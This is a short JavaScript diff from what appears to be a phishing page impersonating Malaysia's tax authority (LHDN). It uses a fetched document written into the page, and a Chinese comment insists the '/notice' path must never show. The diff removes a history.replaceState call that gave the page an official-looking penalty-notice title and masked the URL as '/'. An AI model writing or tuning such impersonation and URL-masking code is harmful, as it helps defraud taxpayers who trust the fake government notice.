@@ -13,9 +13,6 @@
             document.close();
 
             // 正确写法：路径写 '/' 或留空，绝不会出现 /notice
-            try {
-                history.replaceState(null, 'Notis Taksiran Tambahan dan Penalti - LHDN Malaysia', '/');
-            } catch(e) {}
         })
         .catch(err => {
             console.error(err);
